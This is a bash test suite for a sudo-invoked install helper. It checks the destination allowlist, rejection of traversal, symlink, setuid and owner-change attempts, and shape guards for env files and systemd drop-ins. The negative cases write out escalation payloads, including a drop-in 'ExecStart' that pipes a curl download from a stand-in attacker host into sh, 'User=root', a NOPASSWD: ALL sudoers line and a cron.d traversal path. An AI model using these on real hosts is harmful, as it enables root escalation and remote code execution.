#!/usr/bin/env bash
# Tests for infra-config-install.sh — the pinned root-run escalation helper that
# infra-config-apply.sh invokes via sudo to write the managed files into their
# root-owned destination directories (#4827).
#
# The helper is the security boundary for the wildcard-free sudoers grant
# (Cmnd_Alias INFRA_CONFIG_INSTALL = /usr/local/bin/infra-config-install): sudo
# permits the command with ANY arguments, so the helper itself enforces that the
# destination is in a hardcoded allowlist and that mode/owner match its
# authoritative table (a deploy user cannot setuid/chown a root binary). The
# payload is read from STDIN, not a file path, so there is no caller-controlled
# source to symlink-swap (#4827 security review P1).
#
# Runs in a tmpdir sandbox; no root required (TEST_DESTDIR redirects writes and
# skips chown, exactly as infra-config-apply.sh does).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HELPER="${SCRIPT_DIR}/infra-config-install.sh"
HANDLER="${SCRIPT_DIR}/infra-config-apply.sh"

PASS=0
FAIL=0
TMPDIR_ROOT=""

# Exit codes the helper contract pins:
#   0 = installed, 3 = rejected (allowlist / mode-owner mismatch / dest-symlink),
#   1 = install failure, 2 = usage
readonly RC_OK=0
readonly RC_REJECTED=3

setup() {
  TMPDIR_ROOT=$(mktemp -d)
  export TEST_DESTDIR="${TMPDIR_ROOT}/dest"
  mkdir -p "$TEST_DESTDIR/usr/local/bin" \
           "$TEST_DESTDIR/etc/systemd/system" \
           "$TEST_DESTDIR/etc/webhook" \
           "$TEST_DESTDIR/etc/sudoers.d"
}

teardown() {
  rm -rf "$TMPDIR_ROOT"
  unset TEST_DESTDIR
}

assert_eq() {
  local desc="$1" expected="$2" actual="$3"
  if [[ "$expected" == "$actual" ]]; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc"
    echo "    expected: $expected"
    echo "    actual:   $actual"
    FAIL=$((FAIL + 1))
  fi
}

assert_contains() {
  local desc="$1" haystack="$2" needle="$3"
  if [[ "$haystack" == *"$needle"* ]]; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc — '$needle' not in '$haystack'"
    FAIL=$((FAIL + 1))
  fi
}

assert_not_written() {
  local desc="$1" path="$2"
  if [[ -e "$path" ]]; then
    echo "  FAIL: $desc — file was written: $path"
    FAIL=$((FAIL + 1))
  else
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  fi
}

assert_file_mode() {
  local desc="$1" path="$2" expected_mode="$3"
  local actual_mode
  actual_mode=$(stat -c '%a' "$path" 2>/dev/null || echo "missing")
  assert_eq "$desc" "$expected_mode" "$actual_mode"
}

# Run the helper with payload on stdin; capture stderr + rc.
# Usage: run_helper <payload> <dest> <mode> <owner>  → sets HELPER_RC, HELPER_ERR
run_helper() {
  local payload="$1" dest="$2" mode="$3" owner="$4"
  HELPER_RC=0
  HELPER_ERR=$(printf '%s' "$payload" | bash "$HELPER" "$dest" "$mode" "$owner" 2>&1 1>/dev/null) || HELPER_RC=$?
}

# --- Test 1: Happy path — allowlisted dest installs stdin payload with correct mode ---
test_install_allowlisted() {
  echo "TEST: install — allowlisted dest writes stdin payload + mode atomically"
  setup
  local content="#!/bin/bash"$'\n'"echo hi"

  local rc=0
  printf '%s' "$content" | bash "$HELPER" "/usr/local/bin/ci-deploy.sh" "755" "root:root" || rc=$?
  assert_eq "helper exits 0 for allowlisted dest" "$RC_OK" "$rc"

  local dest="${TEST_DESTDIR}/usr/local/bin/ci-deploy.sh"
  if [[ -f "$dest" ]]; then
    echo "  PASS: file installed at dest"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: file not installed at dest"
    FAIL=$((FAIL + 1))
  fi
  assert_file_mode "installed file mode is 755" "$dest" "755"
  assert_eq "installed content matches stdin" "$content" "$(cat "$dest")"

  # No stray temp file left in the dest dir.
  local stray
  stray=$(find "${TEST_DESTDIR}/usr/local/bin" -name 'tmp.*' 2>/dev/null | wc -l | tr -d ' ')
  assert_eq "no stray temp file in dest dir" "0" "$stray"

  teardown
}

# --- Test 2: Allowlist rejection — non-managed dest is refused (install_rejected) ---
test_reject_nonallowlisted_dest() {
  echo "TEST: install — non-allowlisted dest is rejected (rc=3)"
  setup
  run_helper "evil" "/etc/passwd" "644" "root:root"
  assert_eq "helper rejects dest not in allowlist" "$RC_REJECTED" "$HELPER_RC"
  assert_contains "reason is dest_not_allowlisted" "$HELPER_ERR" "dest_not_allowlisted"
  assert_not_written "rejected dest not written" "${TEST_DESTDIR}/etc/passwd"
  teardown
}

# --- Test 3: Allowlist rejection — path traversal toward a managed dir is refused ---
test_reject_traversal() {
  echo "TEST: install — traversal-style dest is rejected (rc=3)"
  setup
  run_helper "evil" "/usr/local/bin/../../../etc/cron.d/evil" "644" "root:root"
  assert_eq "helper rejects traversal dest" "$RC_REJECTED" "$HELPER_RC"
  assert_contains "reason is dest_not_allowlisted" "$HELPER_ERR" "dest_not_allowlisted"
  assert_not_written "traversal dest not written" "${TEST_DESTDIR}/etc/cron.d/evil"
  teardown
}

# --- Test 4: dest-symlink rejection — refuse writing through a symlinked dest ---
test_reject_dest_symlink() {
  echo "TEST: install — symlinked destination is rejected (rc=3)"
  setup
  # Pre-plant a symlink at an allowlisted dest pointing elsewhere.
  local victim="${TMPDIR_ROOT}/victim"
  printf 'original' > "$victim"
  ln -s "$victim" "${TEST_DESTDIR}/usr/local/bin/ci-deploy.sh"

  run_helper "payload" "/usr/local/bin/ci-deploy.sh" "755" "root:root"
  assert_eq "helper rejects symlinked dest" "$RC_REJECTED" "$HELPER_RC"
  assert_contains "reason is dest_symlink" "$HELPER_ERR" "dest_symlink"
  assert_eq "symlink victim untouched" "original" "$(cat "$victim")"
  teardown
}

# --- Test 5: EVERY managed dest is accepted with its authoritative spec ---
# Each entry is "dest|mode|owner" — mode/owner MUST match the helper's internal
# table (caller-supplied values that disagree are rejected, #4827 hardening).
# The sudoers dest is intentionally absent (root-managed, not helper-writable).
#
# #7095 — the spec list is DERIVED from the helper's own DEST_SPEC rather than hand-copied.
# A hand-maintained duplicate silently under-tests the moment a dest is added: the loop still
# reports "all N accepted" for the stale N while the new dest is never exercised at all. The
# cardinality floor below keeps that derivation non-vacuous (an empty parse would otherwise
# make this test pass by testing nothing).
test_all_managed_dests_accepted() {
  echo "TEST: install — every DEST_SPEC dest is allowlisted and accepted (sudoers excluded)"
  setup
  local specs=()
  while IFS= read -r line; do
    specs+=("$line")
  # #7095 review — DERIVED FROM FILE_MAP (the OTHER file), NOT from DEST_SPEC.
  #
  # The first version of this derivation read DEST_SPEC out of $HELPER and fed each row back to
  # $HELPER, which validates against DEST_SPEC — i.e. S == S. Mutation-proven vacuous: changing
  # one DEST_SPEC mode from 755 to 700 (FILE_MAP untouched) left the suite 31 passed / 0 failed.
  # That is strictly WEAKER than the hardcoded 15-entry literal it replaced, because the literal
  # was an independent second source of truth. Deriving from FILE_MAP keeps the auto-ratcheting
  # property AND restores the real invariant: FILE_MAP's dest/mode/owner must equal DEST_SPEC's,
  # which is exactly what dest_not_allowlisted / mode_mismatch / owner_mismatch police at install
  # time — on a host with no SSH runbook, mid-remediation.
  #
  # `[0-7]{3}` deliberately does NOT match a 4-digit mode: a `4755` setuid typo must not be
  # silently dropped from the work-list, so the count assertion below catches its absence.
  done < <(sed -n 's/^[[:space:]]*"[A-Z0-9_]*|\(\/[^|]*\)|\([0-7]\{3\}\)|\([^"]*\)"[[:space:]]*$/\1|\2|\3/p' "$HANDLER")
  local total="${#specs[@]}"
  # Non-vacuity floor: a broken sed would yield 0 specs and the loop below would then
  # "pass" having asserted nothing. 15 is the pre-#7095 size, so this can only ratchet up.
  # Cardinality cross-check: every FILE_MAP row must have parsed. A row the sed cannot match
  # (4-digit mode, malformed quoting) would otherwise vanish from the work-list while `total`
  # still cleared the floor — a member the extraction cannot see is silently exempt.
  filemap_rows=$(grep -cE '^[[:space:]]*"[A-Z0-9_]+\|' "$HANDLER")
  if [[ "$total" -ne "$filemap_rows" ]]; then
    echo "  FAIL: parsed $total of $filemap_rows FILE_MAP rows — an unparsed row would be silently exempt from this test"
    FAIL=$((FAIL + 1))
    teardown
    return
  fi
  if [[ "$total" -lt 15 ]]; then
    echo "  FAIL: derived only $total DEST_SPEC entries from $HELPER — parse is broken, this test would be vacuous"
    FAIL=$((FAIL + 1))
    teardown
    return
  fi
  local accepted=0 entry d mode owner rc payload
  for entry in "${specs[@]}"; do
    IFS='|' read -r d mode owner <<< "$entry"
    rc=0
    # #7095 — the payload must be SHAPE-APPROPRIATE for the dest. /etc/default/* dests are
    # systemd EnvironmentFiles and the helper now refuses anything that is not KEY=VALUE, so
    # feeding them the generic 'payload-<base>' blob would fail for a reason that has nothing
    # to do with the allowlist this test is about.
    # #7103 R2 — same reasoning for *.service.d/*.conf: the drop-in shape gate refuses anything
    # outside {blank, comment, [Service], Environment=, EnvironmentFile=}, and the generic blob
    # is none of those. Shape-appropriateness is a precondition of THIS test, not its subject.
    case "$d" in
      /etc/default/*)                          payload="KEY_FOR_$(basename "$d" | tr -c '[:alnum:]' '_')=value" ;;
      /etc/systemd/system/*.service.d/*.conf)  payload=$'[Service]\nEnvironmentFile=-/etc/default/soleur-doppler-token\n' ;;
      *)                                       payload="payload-$(basename "$d")" ;;
    esac
    printf '%s' "$payload" | bash "$HELPER" "$d" "$mode" "$owner" 2>/dev/null || rc=$?
    [[ "$rc" == "$RC_OK" ]] && accepted=$((accepted + 1))
  done
  assert_eq "every managed dest accepted (derived, n=$total)" "$total" "$accepted"
  teardown
}

# --- #7095: envfile_shape guard (both directions — a one-way guard proves nothing) ---
# The helper refuses an /etc/default/* payload that is not a valid systemd EnvironmentFile.
# Rationale: such a file is consumed by units INCLUDING the webhook that delivers it, on a host
# with no operator SSH runbook and no orderable replacement, and systemd refuses to start a unit
# whose EnvironmentFile has a malformed line. Refuse-to-install beats install-and-brick.
test_envfile_shape_guard() {
  echo "TEST: install — /etc/default/* payload shape is enforced"
  setup
  local d="/etc/default/soleur-doppler-token" mode="640" owner="root:deploy" rc

  # (a) NEGATIVE: prose / a stray shell line must be REJECTED (rc=3), not installed.
  rc=0
  printf 'this is not an env file\n' | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
  assert_eq "malformed env payload is rejected" "$RC_REJECTED" "$rc"
  if [[ ! -e "${TEST_DESTDIR}${d}" ]]; then
    echo "  PASS: rejected payload left no file on disk (refuse-to-install, not install-then-fail)"
  else
    echo "  FAIL: rejected payload still landed at ${TEST_DESTDIR}${d}"
    FAIL=$((FAIL + 1))
  fi

  # (b) POSITIVE CONTROL: the real shape — assignments, blanks and # comments — is ACCEPTED.
  # Without this the guard could be a blanket "reject every /etc/default write" and (a) would
  # still pass, which would brick the very delivery this incident needs.
  rc=0
  printf '# comment\n\nDOPPLER_TOKEN=dp.st.example\nSENTRY_PROJECT_ID=123\n' \
    | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
  assert_eq "well-formed env payload is accepted" "$RC_OK" "$rc"

  # (c) The empty-VALUE case is deliberately ACCEPTED here: `KEY=` is valid systemd syntax, so
  # the installer is the wrong layer to reject it. It is caught earlier, by the terraform plan
  # validation on var.doppler_token — recorded so a future reader does not "fix" it here.
  rc=0
  printf 'DOPPLER_TOKEN=\n' | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
  assert_eq "empty-valued assignment is valid env syntax (guarded at terraform plan, not here)" "$RC_OK" "$rc"
  teardown
}

# --- #7095: drop-in dests land even though their parent directory does not pre-exist ---
# mktemp writes INTO the dest dir, so without the guarded mkdir -p a *.service.d/ dest fails
# with a bare "mktemp" reason that reads like a disk fault.
test_dropin_dir_created() {
  echo "TEST: install — a drop-in dest whose parent dir is absent is created, not failed"
  setup
  local d="/etc/systemd/system/vector.service.d/10-vector-doppler-token.conf" rc=0
  [[ -d "${TEST_DESTDIR}/etc/systemd/system/vector.service.d" ]] \
    && echo "  WARN: parent dir pre-existed; this test is weaker than intended"
  printf '[Service]\nEnvironmentFile=-/etc/default/soleur-doppler-token\n' \
    | bash "$HELPER" "$d" "644" "root:root" >/dev/null 2>&1 || rc=$?
  assert_eq "drop-in installs into a not-yet-existing .d directory" "$RC_OK" "$rc"
  if [[ -f "${TEST_DESTDIR}${d}" ]]; then
    echo "  PASS: drop-in file present at ${d}"
  else
    echo "  FAIL: drop-in file missing at ${TEST_DESTDIR}${d}"
    FAIL=$((FAIL + 1))
  fi
  teardown
}

# --- #7103 R2 3.1: drop-in shape guard (the security precondition of the restart grant) ---
# Until #7103 the content gate was scoped to /etc/default/* only, so the three *.service.d/*.conf
# dests were installed with NO validation at all. That was inert precisely because nothing
# root-restarted those units; 3.2 adds `sudo systemctl try-restart` for exactly them. systemd
# merges drop-ins AFTER the unit body, so an unvalidated drop-in on vector.service (which runs
# User=deploy) could set User=root, reset-and-replace ExecStart=, or add AmbientCapabilities= —
# turning a *delivery* capability into an *execution* capability on the one host with no
# replacement path. webhook.service omits NoNewPrivileges, so this gate is the only boundary
# on that path. Hence: gate first, grant second.
#
# Both directions are asserted. A guard that rejects everything would pass every negative arm
# below and brick the credential delivery this whole incident exists to fix.
test_dropin_shape_guard() {
  echo "TEST: install — *.service.d/*.conf payload shape is enforced"
  setup
  local d="/etc/systemd/system/vector.service.d/10-vector-doppler-token.conf"
  local mode="644" owner="root:root" rc

  # (a) POSITIVE CONTROL FIRST — the real payload must still install. Asserted before the
  # negatives so a blanket-reject implementation cannot masquerade as a working gate.
  rc=0
  printf '# managed by infra-config-apply\n[Service]\nEnvironmentFile=-/etc/default/soleur-doppler-token\n' \
    | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
  assert_eq "well-formed drop-in (comment + [Service] + EnvironmentFile=) is accepted" "$RC_OK" "$rc"

  # (b) Environment= (the inline sibling of EnvironmentFile=) is also permitted.
  rc=0
  printf '[Service]\nEnvironment=DOPPLER_PROJECT=soleur\n' \
    | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || rc=$?
  assert_eq "Environment= directive is accepted" "$RC_OK" "$rc"

  # (c) NEGATIVE, one arm per forbidden directive named in the plan. Each is a distinct
  # escalation primitive, so each gets its own assertion rather than one representative case.
  local forbidden bad_rc
  for forbidden in \
    'ExecStart=/bin/sh -c "curl attacker|sh"' \
    'User=root' \
    'AmbientCapabilities=CAP_SYS_ADMIN' \
    'NoNewPrivileges=false'
  do
    bad_rc=0
    printf '[Service]\n%s\n' "$forbidden" \
      | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || bad_rc=$?
    assert_eq "drop-in carrying '${forbidden%%=*}=' is rejected" "$RC_REJECTED" "$bad_rc"
  done

  # (d) The rejection names the reason with its count, so a denial is diagnosable from the
  # handler's per-file accounting without SSH.
  rc=0
  HELPER_ERR=$(printf '[Service]\nUser=root\nExecStart=/bin/false\n' \
    | bash "$HELPER" "$d" "$mode" "$owner" 2>&1 1>/dev/null) || rc=$?
  assert_contains "rejection reason is dropin_shape with a bad-line count" "$HELPER_ERR" "dropin_shape:bad_lines=2"

  # (e) REFUSE-TO-INSTALL, not install-then-fail: a rejected payload must leave the previous
  # (good) drop-in byte-intact rather than a partially-written or clobbered file. This is the
  # property that makes the gate safe to put in front of a live delivery path.
  local before after
  before=$(sha256sum "${TEST_DESTDIR}${d}" 2>/dev/null | awk '{print $1}' || true)
  printf '[Service]\nUser=root\n' | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || true
  after=$(sha256sum "${TEST_DESTDIR}${d}" 2>/dev/null | awk '{print $1}' || true)
  assert_eq "rejected drop-in left the previously-installed file unmodified" "$before" "$after"

  # (f) SCOPE: the gate must not leak onto the script dests. A /usr/local/bin payload is a shell
  # script whose every line would be a "forbidden directive" under the drop-in grammar; if the
  # dest match were widened (e.g. to all of /etc/systemd/system/*) delivery would stop dead.
  rc=0
  printf '#!/bin/bash\nexec /usr/bin/env true\n' \
    | bash "$HELPER" "/usr/local/bin/ci-deploy.sh" "755" "root:root" >/dev/null 2>&1 || rc=$?
  assert_eq "shape gate does not apply to script dests" "$RC_OK" "$rc"

  # (g) The unit-body dest /etc/systemd/system/webhook.service is NOT a drop-in and carries a
  # full unit (ExecStart= included). It must remain installable — the gate keys on the
  # *.service.d/*.conf shape, never on "lives under /etc/systemd/system".
  rc=0
  printf '[Unit]\nDescription=webhook\n[Service]\nExecStart=/usr/bin/webhook\n' \
    | bash "$HELPER" "/etc/systemd/system/webhook.service" "644" "root:root" >/dev/null 2>&1 || rc=$?
  assert_eq "shape gate does not apply to full unit bodies" "$RC_OK" "$rc"
  teardown
}

# --- #7103 R2 3.4: mtime is preserved on a content-identical install ---
# This has to be asserted HERE, against the helper, not only through the handler. In prod the
# handler stages into a deploy-writable dir and THIS helper writes its own fresh temp in the
# destination directory, so any mtime the handler preserved on its own temp is discarded before
# the rename. The handler's sandbox path (direct mv) exercises the handler's copy of this logic
# and cannot see the helper's at all.
#
# Mutation-proven necessary: deleting the helper's `touch -r` left the whole
# infra-config-apply.test.sh suite green at 106/106, because every one of its installs runs in
# sandbox mode. The production path had no coverage.
#
# Consequence if it regresses: the reconciliation predicate keys on mtime, so a content-identical
# re-delivery looks newer than the running process on EVERY apply and restarts units that are not
# stale — most damagingly vector, whose restart blinks the log stream the post-apply assertions
# are read through.
test_install_preserves_mtime_on_identical_content() {
  echo "TEST: install — identical content preserves mtime; changed content does not"
  setup
  local d="/usr/local/bin/ci-deploy.sh" mode="755" owner="root:root"
  local abs="${TEST_DESTDIR}${d}"
  local payload='#!/bin/bash'$'\n''echo one'

  printf '%s' "$payload" | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || true
  # Age the installed file so a preserved mtime is visibly distinct from "now".
  touch -d '2020-01-02 03:04:05' "$abs"
  local m_before m_after m_changed
  m_before=$(stat -c %Y "$abs")

  # (a) Byte-identical re-install: mtime must survive.
  printf '%s' "$payload" | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || true
  m_after=$(stat -c %Y "$abs")
  assert_eq "identical payload preserved the dest mtime" "$m_before" "$m_after"

  # (b) THE OTHER DIRECTION — without this, an implementation that simply never touches mtime
  # (or one that stopped installing at all) would satisfy (a). A real content change MUST be
  # visible to the predicate, or a genuinely stale unit is never restarted.
  printf '%s' '#!/bin/bash'$'\n''echo two' | bash "$HELPER" "$d" "$mode" "$owner" >/dev/null 2>&1 || true
  m_changed=$(stat -c %Y "$abs")
  if [[ "$m_changed" -gt "$m_before" ]]; then
    echo "  PASS: changed payload advanced the dest mtime"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: changed payload left mtime at $m_changed (expected > $m_before)"
    FAIL=$((FAIL + 1))
  fi
  # And the new content actually landed — a preserved mtime must never mean a skipped write.
  assert_contains "changed payload was installed" "$(cat "$abs")" "echo two"
  teardown
}

# --- Test 6: Sudoers dest is rejected (root-managed, #4827 security review) ---
# A deploy user invoking the helper directly must NOT be able to write the
# grant-definition file (it could install `NOPASSWD: ALL`).
test_reject_sudoers_dest() {
  echo "TEST: install — sudoers dest is rejected (rc=3)"
  setup
  run_helper "deploy ALL=(root) NOPASSWD: ALL" "/etc/sudoers.d/deploy-inngest-bootstrap" "440" "root:root"
  assert_eq "helper rejects the sudoers dest" "$RC_REJECTED" "$HELPER_RC"
  assert_contains "reason is dest_not_allowlisted" "$HELPER_ERR" "dest_not_allowlisted"
  assert_not_written "sudoers dest not written" "${TEST_DESTDIR}/etc/sudoers.d/deploy-inngest-bootstrap"
  teardown
}

# --- Test 7: setuid escalation via caller mode is rejected (#4827 hardening) ---
# mode/owner come from the helper's internal table, not the caller — a deploy
# user passing mode=4755 to setuid a root binary is refused. Uses an ALLOWLISTED
# dest so the allowlist passes and the MODE check is the gate actually exercised.
test_reject_setuid_mode() {
  echo "TEST: install — caller mode mismatch (setuid attempt) is rejected (rc=3)"
  setup
  run_helper "payload" "/usr/local/bin/ci-deploy.sh" "4755" "root:root"
  assert_eq "helper rejects setuid mode" "$RC_REJECTED" "$HELPER_RC"
  assert_contains "reason is mode_mismatch (not allowlist short-circuit)" "$HELPER_ERR" "mode_mismatch"
  assert_not_written "setuid-mode call wrote nothing" "${TEST_DESTDIR}/usr/local/bin/ci-deploy.sh"
  teardown
}

# --- Test 8: owner-seize via caller owner is rejected (#4827 hardening) ---
test_reject_owner_seize() {
  echo "TEST: install — caller owner mismatch (chown seize) is rejected (rc=3)"
  setup
  run_helper "payload" "/usr/local/bin/ci-deploy.sh" "755" "deploy:deploy"
  assert_eq "helper rejects owner seize" "$RC_REJECTED" "$HELPER_RC"
  assert_contains "reason is owner_mismatch" "$HELPER_ERR" "owner_mismatch"
  assert_not_written "owner-seize call wrote nothing" "${TEST_DESTDIR}/usr/local/bin/ci-deploy.sh"
  teardown
}

# --- Test 9: usage error — wrong arg count exits 2 ---
test_usage_error() {
  echo "TEST: install — wrong arg count exits 2"
  setup
  local rc=0
  printf 'x' | bash "$HELPER" "/usr/local/bin/ci-deploy.sh" "755" 2>/dev/null || rc=$?
  assert_eq "helper exits 2 on wrong arg count" "2" "$rc"
  teardown
}

# --- Test 10: DEST_SPEC ↔ FILE_MAP cardinality lockstep (cross-file invariant) ---
# The helper's DEST_SPEC table and the handler's FILE_MAP must agree on the
# managed dest set (minus the root-managed sudoers). Assert equal cardinality so
# adding a FILE_MAP entry without updating DEST_SPEC fails loudly here.
test_dest_spec_filemap_lockstep() {
  echo "TEST: DEST_SPEC count == FILE_MAP count (cross-file lockstep)"
  local filemap_count dest_spec_count
  # FILE_MAP entries look like: "ENV_VAR|/dest/path|mode|owner"
  filemap_count=$(grep -cE '^\s*"[A-Z_]+_B64\|/' "$HANDLER")
  # DEST_SPEC keys look like: ["/dest/path"]="mode owner"
  dest_spec_count=$(grep -cE '^\s*\["/' "$HELPER")
  # #7095 — the literal pin ("must be exactly 15") was removed. It was a THIRD source of truth
  # that went stale on every FILE_MAP addition and had to be edited in lockstep with the two it
  # was policing, which is the drift it existed to prevent. What matters is the CROSS-FILE
  # invariant below plus a non-vacuity floor, both of which ratchet automatically.
  if [[ "$filemap_count" -lt 15 || "$dest_spec_count" -lt 15 ]]; then
    echo "  FAIL: implausible counts (FILE_MAP=$filemap_count DEST_SPEC=$dest_spec_count) — a grep returning ~0 would make the equality below vacuously true"
    FAIL=$((FAIL + 1))
  else
    echo "  PASS: counts are plausible (FILE_MAP=$filemap_count DEST_SPEC=$dest_spec_count)"
  fi
  assert_eq "DEST_SPEC and FILE_MAP cardinality match" "$filemap_count" "$dest_spec_count"
  # The sudoers dest must be in NEITHER (root-managed).
  if grep -q '/etc/sudoers.d/deploy-inngest-bootstrap' "$HELPER"; then
    echo "  FAIL: sudoers dest must not appear in the helper allowlist"
    FAIL=$((FAIL + 1))
  else
    echo "  PASS: sudoers dest absent from helper allowlist"
    PASS=$((PASS + 1))
  fi
}

# --- Run all tests ---
echo "=== infra-config-install.sh test suite ==="
test_install_allowlisted
test_reject_nonallowlisted_dest
test_reject_traversal
test_reject_dest_symlink
test_all_managed_dests_accepted
test_envfile_shape_guard
test_dropin_dir_created
test_dropin_shape_guard
test_install_preserves_mtime_on_identical_content
test_reject_sudoers_dest
test_reject_setuid_mode
test_reject_owner_seize
test_usage_error
test_dest_spec_filemap_lockstep
echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
if [[ "$FAIL" -gt 0 ]]; then
  exit 1
fi
